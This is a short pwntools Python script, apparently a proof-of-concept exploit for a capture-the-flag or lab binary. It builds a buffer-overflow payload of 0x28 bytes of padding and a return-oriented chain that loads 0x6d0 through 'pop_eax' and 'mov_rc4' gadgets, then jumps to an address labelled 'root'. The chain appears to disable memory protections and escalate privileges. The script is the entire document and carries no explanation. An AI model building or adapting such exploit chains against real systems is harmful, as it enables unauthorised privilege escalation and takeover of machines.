from pwn import *

root = 0x8049d83
pop_eax = 0xc183c7f7
mov_rc4 = 0xc1045053

poc = b"A"*0x28
poc += p32(pop_eax)
poc += p32(0x6d0)
poc += p32(mov_rc4)
poc += p32(0xdeadbeef)
poc += p32(0x8049d83)
poc += p32(0xdeadbeef)

print(poc)